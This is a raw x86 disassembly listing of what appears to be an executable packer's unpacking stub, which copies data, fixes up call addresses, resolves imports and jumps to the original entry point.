  497a8e:	mov    al,BYTE PTR [edx]
  497a90:	inc    edx
  497a91:	mov    BYTE PTR [edi],al
  497a93:	inc    edi
  497a94:	dec    ecx
  497a95:	jne    0x497a8e
  497a97:	jmp    0x4979de
  497a9c:	mov    eax,DWORD PTR [edx]
  497a9e:	add    edx,0x4
  497aa1:	mov    DWORD PTR [edi],eax
  497aa3:	add    edi,0x4
  497aa6:	sub    ecx,0x4
  497aa9:	ja     0x497a9c
  497aab:	add    edi,ecx
  497aad:	jmp    0x4979de
  497ab2:	pop    esi
  497ab3:	mov    edi,esi
  497ab5:	mov    ecx,0x2a5d
  497aba:	mov    al,BYTE PTR [edi]
  497abc:	inc    edi
  497abd:	sub    al,0xe8
  497abf:	cmp    al,0x1
  497ac1:	ja     0x497aba
  497ac3:	cmp    BYTE PTR [edi],0x19
  497ac6:	jne    0x497aba
  497ac8:	mov    eax,DWORD PTR [edi]
  497aca:	mov    bl,BYTE PTR [edi+0x4]
  497acd:	shr    ax,0x8
  497ad1:	rol    eax,0x10
  497ad4:	xchg   ah,al
  497ad6:	sub    eax,edi
  497ad8:	sub    bl,0xe8
  497adb:	add    eax,esi
  497add:	mov    DWORD PTR [edi],eax
  497adf:	add    edi,0x5
  497ae2:	mov    al,bl
  497ae4:	loop   0x497abf
  497ae6:	lea    edi,[esi+0x94000]
  497aec:	mov    eax,DWORD PTR [edi]
  497aee:	or     eax,eax
  497af0:	je     0x497b2e
  497af2:	mov    ebx,DWORD PTR [edi+0x4]
  497af5:	lea    eax,[eax+esi*1+0xb9218]
  497afc:	add    ebx,esi
  497afe:	push   eax
  497aff:	add    edi,0x8
  497b02:	call   DWORD PTR [esi+0xb92cc]
  497b08:	xchg   ebp,eax
  497b09:	mov    al,BYTE PTR [edi]
  497b0b:	inc    edi
  497b0c:	or     al,al
  497b0e:	je     0x497aec
  497b10:	mov    ecx,edi
  497b12:	push   edi
  497b13:	dec    eax
  497b14:	repnz scas al,BYTE PTR es:[edi]
  497b16:	push   ebp
  497b17:	call   DWORD PTR [esi+0xb92d0]
  497b1d:	or     eax,eax
  497b1f:	je     0x497b28
  497b21:	mov    DWORD PTR [ebx],eax
  497b23:	add    ebx,0x4
  497b26:	jmp    0x497b09
  497b28:	call   DWORD PTR [esi+0xb92e0]
  497b2e:	mov    ebp,DWORD PTR [esi+0xb92d4]
  497b34:	lea    edi,[esi-0x1000]
  497b3a:	mov    ebx,0x1000
  497b3f:	push   eax
  497b40:	push   esp
  497b41:	push   0x4
  497b43:	push   ebx
  497b44:	push   edi
  497b45:	call   ebp
  497b47:	lea    eax,[edi+0x21f]
  497b4d:	and    BYTE PTR [eax],0x7f
  497b50:	and    BYTE PTR [eax+0x28],0x7f
  497b54:	pop    eax
  497b55:	push   eax
  497b56:	push   esp
  497b57:	push   eax
  497b58:	push   ebx
  497b59:	push   edi
  497b5a:	call   ebp
  497b5c:	pop    eax
  497b5d:	popa   
  497b5e:	lea    eax,[esp-0x80]
  497b62:	push   0x0
  497b64:	cmp    esp,eax
  497b66:	jne    0x497b62
  497b68:	sub    esp,0xffffff80
  497b6b:	jmp    0x455d50
  497b70:	mov    BYTE PTR [ebx+0x49],bh
  497b73:	add    BYTE PTR [eax-0x63ffb685],bl
  497b79:	pusha  
  497b7a:	inc    ebp
	...
